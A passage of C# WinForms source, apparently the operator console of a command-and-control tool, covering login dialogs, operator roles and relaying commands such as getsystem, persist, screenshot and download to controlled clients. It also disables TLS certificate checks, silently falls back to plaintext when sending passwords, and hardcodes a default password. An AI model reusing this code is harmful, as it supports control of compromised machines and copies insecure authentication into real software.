                MinimizeBox = false
            };

            // Server IP
            Label lblIP = new Label
            {
                Text = "Server IP:",
                Location = new Point(20, 20),
                Size = new Size(80, 20),
                ForeColor = Color.FromArgb(220, 220, 220)
            };

            TextBox txtIP = new TextBox
            {
                Location = new Point(110, 20),
                Size = new Size(200, 20),
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220),
                //   Text = "192.168.159.130"
            };

            // Port
            Label lblPort = new Label
            {
                Text = "Port:",
                Location = new Point(20, 50),
                Size = new Size(80, 20),
                ForeColor = Color.FromArgb(220, 220, 220)
            };

            TextBox txtOpPort = new TextBox
            {
                Location = new Point(110, 50),
                Size = new Size(200, 20),
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220),
                Text = "9191"
            };

            // Username
            Label lblUsername = new Label
            {
                Text = "Username:",
                Location = new Point(20, 80),
                Size = new Size(80, 20),
                ForeColor = Color.FromArgb(220, 220, 220)
            };

            TextBox txtUsername = new TextBox
            {
                Location = new Point(110, 80),
                Size = new Size(200, 20),
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220),
                Text = "operator"
            };

            // Password
            Label lblPassword = new Label
            {
                Text = "Password:",
                Location = new Point(20, 110),
                Size = new Size(80, 20),
                ForeColor = Color.FromArgb(220, 220, 220)
            };

            TextBox txtPassword = new TextBox
            {
                Location = new Point(110, 110),
                Size = new Size(200, 20),
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220),
                UseSystemPasswordChar = true,
                Text = "OpPass2024!"
            };

            // Info label
            Label lblInfo = new Label
            {
                Text = "Connect to an operator server to collaborate with other operators.",
                Location = new Point(20, 140),
                Size = new Size(350, 20),
                AutoSize = true,
                ForeColor = Color.FromArgb(150, 150, 150),
                Font = new Font(this.Font.FontFamily, 8)
            };

            // Buttons
            Button btnConnect = new Button
            {
                Text = "Connect",
                Location = new Point(120, 170),
                Size = new Size(80, 30),
                DialogResult = DialogResult.OK,
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(0, 120, 215),
                ForeColor = Color.White
            };

            Button btnCancel = new Button
            {
                Text = "Cancel",
                Location = new Point(210, 170),
                Size = new Size(80, 30),
                DialogResult = DialogResult.Cancel,
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220)
            };

            // Manage Operators button
            Button btnManage = new Button
            {
                Text = "Manage Operators",
                Location = new Point(300, 170),
                Size = new Size(110, 30),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(108, 117, 125),
                ForeColor = Color.White
            };
            btnManage.Click += (s, e) => { connectionForm.Close(); ShowOperatorManagementDialog(); };

            connectionForm.Controls.AddRange(new Control[] {
        lblIP, txtIP, lblPort, txtOpPort, lblUsername, txtUsername,
        lblPassword, txtPassword, lblInfo, btnConnect, btnCancel, btnManage
    });

            if (connectionForm.ShowDialog() == DialogResult.OK)
            {
                string ip = txtIP.Text.Trim();
                string port = txtOpPort.Text.Trim();
                string username = txtUsername.Text.Trim();
                string password = txtPassword.Text.Trim();

                if (string.IsNullOrEmpty(ip) || string.IsNullOrEmpty(port) ||
                    string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
                {
                    MessageBox.Show("Please fill in all fields.", "Missing Information", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                if (!int.TryParse(port, out int portNum) || portNum <= 0 || portNum > 65535)
                {
                    MessageBox.Show("Please enter a valid port number.", "Invalid Port", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                // Create a temporary profile for this connection
                var tempProfile = new OperatorProfile
                {
                    ProfileName = "Manual Connection",
                    ServerIP = ip,
                    OperatorPort = portNum,
                    Username = username,
                    EncryptedPassword = OperatorProfileManager.EncryptPassword(password)
                };

                // Connect using the temporary profile
                Task.Run(async () =>
                {
                    try
                    {
                        await ConnectUsingProfile(tempProfile);
                    }
                    catch (Exception ex)
                    {
                        this.Invoke(new Action(() =>
                        {
                            LogMessage($"[!] Connection error: {ex.Message}", Color.Red);
                        }));
                    }
                });
            }
        }

        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {

            return true;
        }
        private void ShowOperatorManagementDialog()
        {
            Form manageForm = new Form
            {
                Text = "Manage Operators",
                Size = new Size(600, 500),
                StartPosition = FormStartPosition.CenterParent,
                BackColor = Color.FromArgb(30, 30, 30),
                ForeColor = Color.FromArgb(220, 220, 220)
            };

            // Operator list
            ListView lvManageOps = new ListView
            {
                Location = new Point(20, 20),
                Size = new Size(550, 300),
                View = View.Details,
                FullRowSelect = true,
                GridLines = true,
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220)
            };

            lvManageOps.Columns.Add("Username", 150);
            lvManageOps.Columns.Add("Role", 100);
            lvManageOps.Columns.Add("Enabled", 80);
            lvManageOps.Columns.Add("Created", 150);

            // Load operators
            var config = OperatorConfigManager.GetConfig();
            foreach (var op in config.Operators)
            {
                var item = new ListViewItem(op.Username);
                item.SubItems.Add(op.Role);
                item.SubItems.Add(op.Enabled ? "Yes" : "No");
                item.SubItems.Add(op.CreatedAt.ToString("yyyy-MM-dd HH:mm"));
                item.Tag = op;
                lvManageOps.Items.Add(item);
            }

            // Add operator button
            Button btnAdd = new Button
            {
                Text = "Add Operator",
                Location = new Point(20, 340),
                Size = new Size(100, 30),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(40, 167, 69),
                ForeColor = Color.White
            };
            btnAdd.Click += (s, e) => ShowAddOperatorDialog(lvManageOps);

            // Remove operator button
            Button btnRemove = new Button
            {
                Text = "Remove",
                Location = new Point(130, 340),
                Size = new Size(80, 30),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(220, 53, 69),
                ForeColor = Color.White
            };
            btnRemove.Click += (s, e) =>
            {
                if (lvManageOps.SelectedItems.Count > 0)
                {
                    var op = (OperatorCredential)lvManageOps.SelectedItems[0].Tag;
                    OperatorConfigManager.RemoveOperator(op.Username);
                    lvManageOps.Items.Remove(lvManageOps.SelectedItems[0]);
                    LogMessage($"[*] Operator {op.Username} removed", Color.Yellow);
                }
            };

            Button btnClose = new Button
            {
                Text = "Close",
                Location = new Point(490, 340),
                Size = new Size(80, 30),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(108, 117, 125),
                ForeColor = Color.White
            };
            btnClose.Click += (s, e) => manageForm.Close();

            manageForm.Controls.AddRange(new Control[] { lvManageOps, btnAdd, btnRemove, btnClose });
            manageForm.ShowDialog();
        }

        private void ShowAddOperatorDialog(ListView parentList)
        {
            Form addForm = new Form
            {
                Text = "Add New Operator",
                Size = new Size(350, 220),
                StartPosition = FormStartPosition.CenterParent,
                FormBorderStyle = FormBorderStyle.FixedDialog,
                BackColor = Color.FromArgb(30, 30, 30),
                ForeColor = Color.FromArgb(220, 220, 220),
                MaximizeBox = false,
                MinimizeBox = false
            };

            Label lblUser = new Label { Text = "Username:", Location = new Point(20, 20), AutoSize = true };
            TextBox txtUser = new TextBox { Location = new Point(100, 17), Size = new Size(200, 23), BackColor = Color.FromArgb(45, 45, 48), ForeColor = Color.FromArgb(220, 220, 220) };

            Label lblPass = new Label { Text = "Password:", Location = new Point(20, 55), AutoSize = true };
            TextBox txtPass = new TextBox { Location = new Point(100, 52), Size = new Size(200, 23), BackColor = Color.FromArgb(45, 45, 48), ForeColor = Color.FromArgb(220, 220, 220) };

            Label lblRole = new Label { Text = "Role:", Location = new Point(20, 90), AutoSize = true };
            ComboBox cmbRole = new ComboBox
            {
                Location = new Point(100, 87),
                Size = new Size(200, 23),
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220),
                DropDownStyle = ComboBoxStyle.DropDownList
            };

            cmbRole.Items.AddRange(new[] { "Operator", "Observer" });
            cmbRole.SelectedIndex = 0;

            Label lblRoleDesc = new Label
            {
                Text = "⚡ Operator: Full access | 👁️ Observer: View only",
                Location = new Point(100, 115),
                Size = new Size(200, 30),
                ForeColor = Color.FromArgb(150, 150, 150),
                Font = new Font(addForm.Font.FontFamily, 8)
            };

            Button btnAdd = new Button { Text = "Add", Location = new Point(100, 150), Size = new Size(80, 30), DialogResult = DialogResult.OK, FlatStyle = FlatStyle.Flat, BackColor = Color.FromArgb(40, 167, 69), ForeColor = Color.White };
            Button btnCancel = new Button { Text = "Cancel", Location = new Point(190, 150), Size = new Size(80, 30), DialogResult = DialogResult.Cancel, FlatStyle = FlatStyle.Flat, BackColor = Color.FromArgb(108, 117, 125), ForeColor = Color.White };

            addForm.Controls.AddRange(new Control[] { lblUser, txtUser, lblPass, txtPass, lblRole, cmbRole, lblRoleDesc, btnAdd, btnCancel });

            if (addForm.ShowDialog() == DialogResult.OK)
            {
                if (!string.IsNullOrEmpty(txtUser.Text) && !string.IsNullOrEmpty(txtPass.Text))
                {
                    try
                    {
                        OperatorConfigManager.AddOperator(txtUser.Text, txtPass.Text, cmbRole.SelectedItem.ToString());

                        var item = new ListViewItem(txtUser.Text);
                        item.SubItems.Add(cmbRole.SelectedItem.ToString());
                        item.SubItems.Add("Yes");
                        item.SubItems.Add(DateTime.Now.ToString("yyyy-MM-dd HH:mm"));
                        parentList.Items.Add(item);

                        string roleEmoji = cmbRole.SelectedItem.ToString() == "Observer" ? "👁️" : "⚡";
                        LogMessage($"[+] {roleEmoji} {cmbRole.SelectedItem} '{txtUser.Text}' added", Color.Green);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"Error adding operator: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
        }


        private async Task ConnectToOperatorServer()
        {
            try
            {
                if (_isOperatorConnected)
                {
                    LogMessage("[!] Already connected to operator server", Color.Yellow);
                    return;
                }

                // Set connection state flags
                _operatorConnectionInProgress = true;
                _operatorAuthenticationFailed = false;

                var profile = _selectedProfile ?? OperatorProfileManager.GetDefaultProfile() ?? OperatorProfileManager.LoadProfiles().FirstOrDefault();
                if (profile == null)
                {
                    LogMessage("[!] No operator profiles configured", Color.Red);
                    _operatorConnectionInProgress = false;
                    return;
                }

                string serverIp = profile.ServerIP;
                int port = profile.OperatorPort;
                _operatorUsername = profile.Username;
                string operatorPassword = OperatorProfileManager.DecryptPassword(profile.EncryptedPassword);

                LogMessage($"[*] Connecting to operator server at {serverIp}:{port}...", Color.Yellow);

                // Create and configure connection
                _operatorConnection = new TcpClient();
                _operatorConnection.ReceiveTimeout = 0;
                _operatorConnection.SendTimeout = 30000;

                await _operatorConnection.ConnectAsync(serverIp, port);
                // LogMessage("[DEBUG] TCP connection established", Color.Gray);

                NetworkStream baseStream = _operatorConnection.GetStream();
                Stream activeStream = baseStream;
                bool isEncrypted = false;

                // Try TLS
                try
                {
                    LogMessage("[*] Attempting secure TLS connection...", Color.Cyan);

                    SslStream sslStream = new SslStream(baseStream, false, (sender, cert, chain, errors) => true);
                    await sslStream.AuthenticateAsClientAsync(serverIp);

                    activeStream = sslStream;
                    isEncrypted = true;
                }
                catch (Exception tlsEx)
                {
                    LogMessage($"[!] TLS failed, using plain text: {tlsEx.Message}", Color.Orange);
                    activeStream = baseStream;
                    isEncrypted = false;
                }

                _operatorStream = activeStream;

                // Send authentication immediately
                LogMessage("[*] Authenticating...", Color.Yellow);

                var authMessage = new OperatorMessage
                {
                    Type = OperatorMessageType.Authentication,
                    From = _operatorUsername,
                    Data = JsonSerializer.Serialize(new Dictionary<string, string>
                    {
                        ["Username"] = _operatorUsername,
                        ["Password"] = operatorPassword
                    })
                };

                string authJson = JsonSerializer.Serialize(authMessage);
                byte[] authData = Encoding.UTF8.GetBytes(authJson);
                await _operatorStream.WriteAsync(authData, 0, authData.Length);
                await _operatorStream.FlushAsync();


                _operatorReceiveTask = Task.Run(async () =>
                {
                    try
                    {
                        await HandleOperatorMessages();
                    }
                    catch (Exception ex)
                    {
                    }
                });

                await Task.Delay(500);



                _selectedProfile = null;
                _operatorConnectionInProgress = false;
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Failed to connect to operator server: {ex.Message}", Color.Red);

                // Clean up connection state
                _operatorConnectionInProgress = false;
                _operatorAuthenticationFailed = true;

                _operatorConnection?.Close();
                _operatorConnection = null;
                _operatorStream = null;
                _selectedProfile = null;
            }
        }

        private async Task HandleOperatorMessages()
        {

            try
            {
                byte[] buffer = new byte[4096];
                StringBuilder messageBuffer = new StringBuilder();

                while (_operatorConnection?.Connected == true)
                {
                    try
                    {
                        // Simple blocking read
                        int bytesRead = await _operatorStream.ReadAsync(buffer, 0, buffer.Length);

                        if (bytesRead == 0)
                        {
                            break;
                        }

                        string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                        messageBuffer.Append(receivedData);
                        string fullBuffer = messageBuffer.ToString();

                        // Process all complete JSON messages in the buffer
                        await ProcessCompleteMessages(messageBuffer);

                    }
                    catch (Exception readEx)
                    {
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
            }
            finally
            {
                this.Invoke(new Action(() =>
                {
                    if (_isOperatorConnected)
                    {
                        LogMessage("[*] Operator connection lost", Color.Yellow);
                        DisconnectFromOperatorServer();
                    }
                }));
            }
        }

        private async Task ProcessCompleteMessages(StringBuilder messageBuffer)
        {
            string bufferContent = messageBuffer.ToString();
            int processedLength = 0;

            while (true)
            {
                // Find the start of a JSON message
                int jsonStart = bufferContent.IndexOf('{', processedLength);
                if (jsonStart == -1)
                {
                    // No more JSON messages to process
                    break;
                }

                // Find the matching closing brace
                int braceCount = 0;
                int jsonEnd = -1;

                for (int i = jsonStart; i < bufferContent.Length; i++)
                {
                    char c = bufferContent[i];

                    if (c == '{')
                    {
                        braceCount++;
                    }
                    else if (c == '}')
                    {
                        braceCount--;
                        if (braceCount == 0)
                        {
                            jsonEnd = i;
                            break;
                        }
                    }
                }

                if (jsonEnd == -1)
                {
                    break;
                }

                // Extract complete JSON message
                string jsonMessage = bufferContent.Substring(jsonStart, jsonEnd - jsonStart + 1);

                this.Invoke(new Action(() =>
                {
                    try
                    {
                        var message = JsonSerializer.Deserialize<OperatorMessage>(jsonMessage);
                        ProcessOperatorMessage(message);
                    }
                    catch (Exception parseEx)
                    {
                    }
                }));

                // Move past this processed message
                processedLength = jsonEnd + 1;
            }

            // Remove processed content from buffer
            if (processedLength > 0)
            {
                string remainingContent = bufferContent.Substring(processedLength);
                messageBuffer.Clear();
                messageBuffer.Append(remainingContent);
            }
        }


        private void ProcessOperatorMessage(OperatorMessage message)
        {
            try
            {
                switch (message.Type)
                {
                    case OperatorMessageType.AuthResponse:
                        if (message.Data == "AUTH_SUCCESS")
                        {
                            _isOperatorConnected = true;
                            btnConnectOperator.Text = "Disconnect";
                            StyleButton(btnConnectOperator, Color.FromArgb(220, 53, 69));

                            // Extract role
                            _currentOperatorRole = "Operator"; // Default
                            if (message.Payload != null)
                            {
                                try
                                {
                                    var roleData = JsonSerializer.Deserialize<Dictionary<string, object>>(message.Payload.ToString());
                                    _currentOperatorRole = roleData["Role"].ToString();
                                }
                                catch { }
                            }

                            LogMessage($"[+] Successfully connected as operator: {_operatorUsername}", Color.Green);
                            LogMessage($"[*] Role: {_currentOperatorRole}", Color.Cyan);

                            EnableOperatorModeUI();
                            SetupOperatorActivityHandling();
                            Task.Run(async () => await RequestClientListFromServer());
                            Task.Run(async () => await StartClientHeartbeat());
                        }
                        else if (message.Data == "AUTH_FAILED_ALREADY_CONNECTED")
                        {
                            string detailMessage = "[!] Authentication failed: This account is already in use";

                            if (message.Payload != null)
                            {
                                try
                                {
                                    var payload = JsonSerializer.Deserialize<Dictionary<string, object>>(message.Payload.ToString());
                                    string existingIP = payload.GetValueOrDefault("ExistingConnectionIP", "unknown").ToString();
                                    string existingTime = payload.GetValueOrDefault("ExistingConnectionTime", "unknown").ToString();

                                    if (DateTime.TryParse(existingTime, out DateTime connTime))
                                    {
                                        var duration = DateTime.Now - connTime;
                                        string durationStr = duration.TotalMinutes < 60
                                            ? $"{(int)duration.TotalMinutes} minutes ago"
                                            : $"{(int)duration.TotalHours} hours ago";

                                        detailMessage = $"[!] Account '{_operatorUsername}' is already in use from {existingIP} (connected {durationStr})";
                                    }
                                    else
                                    {
                                        detailMessage = $"[!] Account '{_operatorUsername}' is already in use from {existingIP}";
                                    }
                                }
                                catch
                                {
                                    // Use default message if payload parsing fails
                                }
                            }

                            LogMessage(detailMessage, Color.Red);
                            LogMessage("[*] Please contact the administrator if you believe this is an error", Color.Yellow);

                            this.Invoke(new Action(() =>
                            {
                                MessageBox.Show(
                                    $"Account '{_operatorUsername}' is already in use.\n\n" +
                                    "Another user is currently logged in with this account from a different location.\n\n" +
                                    "Only one session per account is allowed. If you believe this is an error,\n" +
                                    "please contact your administrator to check for unauthorized access.",
                                    "Account Already In Use",
                                    MessageBoxButtons.OK,
                                    MessageBoxIcon.Warning);
                            }));

                            DisconnectFromOperatorServer();
                        }
                        else
                        {
                            LogMessage("[!] Authentication failed - Invalid credentials", Color.Red);
                            DisconnectFromOperatorServer();
                        }
                        break;

                    case OperatorMessageType.HeartBeat:
                        if (message.Data == "PONG" || message.Data == "PING_KEEP_ALIVE")
                        {

                            if (message.Data == "PING_KEEP_ALIVE")
                            {
                                Task.Run(async () =>
                                {
                                    try
                                    {
                                        var response = new OperatorMessage
                                        {
                                            Type = OperatorMessageType.HeartBeat,
                                            From = _operatorUsername,
                                            Data = "PONG_ALIVE"
                                        };

                                        string responseJson = JsonSerializer.Serialize(response);
                                        byte[] data = Encoding.UTF8.GetBytes(responseJson);
                                        await _operatorStream.WriteAsync(data, 0, data.Length);
                                        await _operatorStream.FlushAsync();
                                    }
                                    catch { }
                                });
                            }
                        }
                        break;

                    case OperatorMessageType.ClientUpdate:
                        if (!string.IsNullOrEmpty(message.ClientId))
                        {
                            string action = message.Data?.ToUpper() ?? "UNKNOWN";
                            Color updateColor = action switch
                            {
                                "CONNECTED" => Color.Green,
                                "DISCONNECTED" => Color.Yellow,
                                "KILLED" => Color.Red,
                                _ => Color.Cyan
                            };

                            string activityMessage = $"[CLIENT] {message.ClientId}: {action}";
                            LogMessage(activityMessage, updateColor);
                            AddActivityItem(activityMessage, updateColor);

                            Task.Run(async () =>
                            {
                                await Task.Delay(500);
                                await RequestClientListFromServer();
                            });
                        }
                        break;

                    case OperatorMessageType.OperatorJoin:
                        string joinMessage = $"[OPERATOR] {message.Data}";
                        LogMessage(joinMessage, Color.Purple);
                        AddActivityItem(joinMessage, Color.Purple);
                        break;

                    case OperatorMessageType.OperatorLeave:
                        string leaveMessage = $"[OPERATOR] {message.Data}";
                        LogMessage(leaveMessage, Color.Orange);
                        AddActivityItem(leaveMessage, Color.Orange);
                        break;

                    case OperatorMessageType.Command:
                        if (!string.IsNullOrEmpty(message.From) && message.From != _operatorUsername)
                        {
                            string cmdDisplay = !string.IsNullOrEmpty(message.ClientId)
                                ? $"[{message.ClientId}] {message.Data}"
                                : message.Data;

                            string rolePrefix = message.From switch
                            {
                                "SERVER" => "🖥️",
                                _ => "⚡"
                            };

                            string commandMessage = $"[{rolePrefix} {message.From}] > {cmdDisplay}";
                            LogMessage(commandMessage, Color.Magenta);

                            // Add to activity panel for important commands
                            if (message.Data.Contains("connect") || message.Data.Contains("disconnect") ||
                                message.Data.Contains("screenshot") || message.Data.Contains("download") ||
                                message.Data.Contains("upload") || message.Data.Contains("getsystem") ||
                                message.Data.Contains("persist"))
                            {
                                AddActivityItem($"{rolePrefix} {message.From}: {message.Data}", Color.Magenta);
                            }
                        }
                        break;

                    case OperatorMessageType.Chat:
                        string chatMessage = $"[CHAT] {message.From}: {message.Data}";
                        LogMessage(chatMessage, Color.Magenta);
                        AddActivityItem(chatMessage, Color.Magenta);
                        break;

                    case OperatorMessageType.Authentication:
                        // Silent - handled elsewhere
                        break;

                    case OperatorMessageType.ClientList:
                        try
                        {
                            var clients = JsonSerializer.Deserialize<List<Dictionary<string, object>>>(message.Data);
                            UpdateClientListFromOperatorData(clients);


                            if (_isTopologyView && _topologyViewer != null)
                            {
                                // Add a small delay to ensure ListView is updated first
                                Task.Run(async () =>
                                {
                                    await Task.Delay(100);
                                    this.Invoke(new Action(() =>
                                    {
                                        UpdateTopologyView();
                                    }));
                                });
                            }
                        }
                        catch (Exception ex)
                        {
                            LogMessage($"[!] Error parsing client list: {ex.Message}", Color.Red);
                        }
                        break;

                    case OperatorMessageType.Response:
                        if (!string.IsNullOrEmpty(message.Data))
                        {
                            if (message.Data.StartsWith("[DEBUG]"))
                                return;

                            Color responseColor = Color.Green; // Default to green for operators

                            if (!string.IsNullOrEmpty(message.ColorHint))
                            {
                                try
                                {
                                    responseColor = ColorTranslator.FromHtml(message.ColorHint);
                                }
                                catch
                                {
                                    // If color parsing fails, determine color from content
                                    responseColor = DetermineClientResponseColor(message.Data);
                                }
                            }
                            else
                            {
                                // No color hint, determine from content
                                responseColor = DetermineClientResponseColor(message.Data);
                            }

                            if (message.From == "SERVER" && message.Data.Contains("] >"))
                            {
                                // This is a command echo, use blue color
                                responseColor = Color.Blue;
                            }

                            LogMessage(message.Data, responseColor);

                            // Add important responses to activity panel
                            if (message.Data.Contains("Connected") || message.Data.Contains("Disconnected") ||
                                message.Data.Contains("Download") || message.Data.Contains("Upload") ||
                                message.Data.Contains("Screenshot") || message.Data.Contains("SYSTEM") ||
                                message.Data.Contains("Admin") || message.Data.Contains("Persistence") ||
                                message.Data.Contains("successfully") || message.Data.Contains("completed") ||
                                message.Data.Contains("failed") || message.Data.Contains("error"))
                            {
                                AddActivityItem(message.Data, responseColor);
                            }
                        }
                        break;

                    case OperatorMessageType.Error:
                        string errorMessage = $"[ERROR] {message.Data}";
                        LogMessage(errorMessage, Color.Red);
                        AddActivityItem(errorMessage, Color.Red);
                        break;

                    case OperatorMessageType.Notification:
                        if (!string.IsNullOrEmpty(message.Data))
                        {
                            if (message.Data.Contains("Login attempt detected"))
                            {
                                LogMessage($"[SECURITY] {message.Data}", Color.Orange);
                                AddActivityItem($"[SECURITY] Login attempt detected", Color.Orange);

                                this.Invoke(new Action(() =>
                                {
                                    var result = MessageBox.Show(
                                        message.Data + "\n\nYour session remains secure and active.",
                                        "Security Alert - Login Attempt",
                                        MessageBoxButtons.OK,
                                        MessageBoxIcon.Information);
                                }));
                            }
                            else if (message.Data.Contains("disconnected due to") ||
                                message.Data.Contains("Forced disconnect"))
                            {
                                LogMessage($"[!] {message.Data}", Color.Red);
                                AddActivityItem($"[DISCONNECT] {message.Data}", Color.Red);

                                this.Invoke(new Action(() =>
                                {
                                    MessageBox.Show(
                                        message.Data,
                                        "Connection Terminated",
                                        MessageBoxButtons.OK,
                                        MessageBoxIcon.Warning);
                                }));

                                DisconnectFromOperatorServer();
                            }
                            else
                            {
                                string notificationMessage = $"[NOTIFICATION] {message.Data}";
                                LogMessage(notificationMessage, Color.Cyan);
                                AddActivityItem(notificationMessage, Color.Cyan);
                            }
                        }
                        break;

                    default:
                        break;
                }
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error in ProcessOperatorMessage: {ex.Message}", Color.Red);
                AddActivityItem($"[ERROR] Message processing failed", Color.Red);
            }
        }


        private Color DetermineClientResponseColor(string message)
        {
            // Keep error messages red
            if (message.Contains("[!]") || message.Contains("Error") || message.Contains("Failed") ||
                message.Contains("error") || message.Contains("failed"))
            {
                return Color.Red;
            }

            // Keep warning messages yellow
            if (message.Contains("[*]") || message.Contains("Warning") || message.Contains("warning"))
            {
                return Color.Yellow;
            }

            // Keep success messages green
            if (message.Contains("[+]") || message.Contains("Success") || message.Contains("success") ||
                message.Contains("completed") || message.Contains("successfully"))
            {
                return Color.Green;
            }

            // Default: Make command output green for operators
            return Color.Green;
        }

        private void RefreshClientListFormatting()
        {
            if (InvokeRequired)
            {
                Invoke(new Action(RefreshClientListFormatting));
                return;
            }

            try
            {
                foreach (ListViewItem item in lvClients.Items)
                {
                    string clientId = item.Tag?.ToString();

                    if (clientId == _operatorActiveClientId)
                    {
                        item.Font = new Font(lvClients.Font, FontStyle.Bold);
                    }
                    else
                    {
                        item.Font = lvClients.Font; // Reset to normal font
                    }
                }
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error refreshing client list formatting: {ex.Message}", Color.Red);
            }
        }

        private void EnableOperatorModeUI()
        {
            if (InvokeRequired)
            {
                Invoke(new Action(EnableOperatorModeUI));
                return;
            }

            try
            {
                // Enable command controls
                txtCommand.Enabled = true;
                btnSendCommand.Enabled = true;

                // Handle Observer role restrictions
                if (_currentOperatorRole == "Observer")
                {
                    txtCommand.Enabled = false;
                    btnSendCommand.Enabled = false;
                    txtCommand.PlaceholderText = "Observer mode - commands disabled";
                    txtCommand.Text = "";
                }
                else
                {
                    txtCommand.Enabled = true;
                    btnSendCommand.Enabled = true;
                    txtCommand.PlaceholderText = "Enter command...";
                }

                // HIDE SERVER MANAGEMENT CONTROLS
                txtIPAddress.Visible = false;
                txtPort.Visible = false;
                btnStartServer.Visible = false;

                // HIDE SERVER-ONLY BUTTONS
                var btnBuildClient = panel2.Controls.Find("btnBuildClient", false).FirstOrDefault();
                if (btnBuildClient != null) btnBuildClient.Visible = false;

                if (btnToggleMultiplayer != null) btnToggleMultiplayer.Visible = false;

                if (btnManageUsers != null) btnManageUsers.Visible = false;

                // Show disconnect button
                btnConnectOperator.Visible = true;
                btnConnectOperator.Text = "Disconnect";

                // Hide IP/Port labels
                var label1 = panel2.Controls.OfType<Label>().FirstOrDefault(l => l.Text.Contains("IP Address"));
                var label2 = panel2.Controls.OfType<Label>().FirstOrDefault(l => l.Text.Contains("Port"));
                if (label1 != null) label1.Visible = false;
                if (label2 != null) label2.Visible = false;

                // Add operator mode indicator
                var operatorLabel = panel2.Controls.Find("lblOperatorMode", false).FirstOrDefault() as Label;
                if (operatorLabel == null)
                {
                    operatorLabel = new Label
                    {
                        Name = "lblOperatorMode",
                        Location = new Point(10, 12),
                        Size = new Size(400, 20),
                        ForeColor = _currentOperatorRole == "Observer" ? Color.Orange : Color.FromArgb(0, 120, 215),
                        Font = new Font(this.Font.FontFamily, 9, FontStyle.Bold)
                    };
                    panel2.Controls.Add(operatorLabel);
                }

                string roleEmoji = _currentOperatorRole == "Observer" ? "👁️" : "⚡";
                string accessLevel = _currentOperatorRole == "Observer" ? "VIEW ONLY" : "FULL ACCESS";
                operatorLabel.Text = $"{roleEmoji} {_currentOperatorRole} Mode: {_operatorUsername} ({accessLevel})";
                operatorLabel.ForeColor = _currentOperatorRole == "Observer" ? Color.Orange : Color.FromArgb(0, 120, 215);
                operatorLabel.Visible = true;

                if (activityPanel != null)
                {
                    activityPanel.Visible = true;
                    activityPanel.Controls.Clear();

                    // Add initial connection message
                    AddActivityItem($"{roleEmoji} {_currentOperatorRole} mode activated: {_operatorUsername}",
                                   _currentOperatorRole == "Observer" ? Color.Orange : Color.Green);

                    // Add role explanation
                    string roleInfo = _currentOperatorRole == "Observer"
                        ? "Observer mode: View clients and activity only"
                        : "Operator mode: Full command and control access";
                    AddActivityItem(roleInfo, Color.Cyan);
                }

                // Start activity cleanup timer if not running
                if (activityCleanupTimer != null && !activityCleanupTimer.Enabled)
                {
                    activityCleanupTimer.Start();
                }

                string modeMessage = _currentOperatorRole == "Observer"
                    ? "[*] Observer mode - you can view client lists and session info only"
                    : "[*] Operator mode - you can send commands and use all features";
                LogMessage(modeMessage, _currentOperatorRole == "Observer" ? Color.Orange : Color.Green);

                if (_currentOperatorRole != "Observer")
                {
                    txtCommand.Focus();
                }

                UpdateOperatorModeVisuals();

            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error enabling operator UI: {ex.Message}", Color.Red);
            }
        }
        private void DisableOperatorModeUI()
        {
            if (InvokeRequired)
            {
                Invoke(new Action(DisableOperatorModeUI));
                return;
            }

            try
            {
                // Disable command input controls
                txtCommand.Enabled = false;
                btnSendCommand.Enabled = false;

                // SHOW SERVER MANAGEMENT CONTROLS AGAIN
                txtIPAddress.Visible = true;
                txtPort.Visible = true;
                btnStartServer.Visible = true;

                // SHOW SERVER-ONLY BUTTONS AGAIN
                var btnBuildClient = panel2.Controls.Find("btnBuildClient", false).FirstOrDefault();
                if (btnBuildClient != null)
                {
                    btnBuildClient.Visible = true;
                }

                if (btnToggleMultiplayer != null)
                {
                    btnToggleMultiplayer.Visible = true;
                }

                if (btnManageUsers != null)
                {
                    btnManageUsers.Visible = true;
                    btnManageUsers.Enabled = _multiplayerEnabled; // Only enable if multiplayer is enabled
                }

                // Reset connect operator button
                btnConnectOperator.Text = "Connect as Operator";
                StyleButton(btnConnectOperator, Color.FromArgb(120, 0, 215));

                // Show labels for IP and Port
                var label1 = panel2.Controls.OfType<Label>().FirstOrDefault(l => l.Text.Contains("IP Address"));
                var label2 = panel2.Controls.OfType<Label>().FirstOrDefault(l => l.Text.Contains("Port"));
                if (label1 != null) label1.Visible = true;
                if (label2 != null) label2.Visible = true;

                // Hide operator mode indicator
                var operatorLabel = panel2.Controls.Find("lblOperatorMode", false).FirstOrDefault();
                if (operatorLabel != null)
                {
                    operatorLabel.Visible = false;
                }

                if (activityPanel != null)
                {
                    activityPanel.Controls.Clear();
                    AddActivityItem("Operator mode disconnected", Color.Yellow);
                }

                lvClients.Items.Clear();

                LogMessage("[*] Operator mode UI disabled", Color.Yellow);
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error disabling operator UI: {ex.Message}", Color.Red);
            }
        }



        private async Task RequestClientListFromServer()
        {
            if (!_isOperatorConnected || _operatorConnection?.Connected != true)
                return;

            try
            {
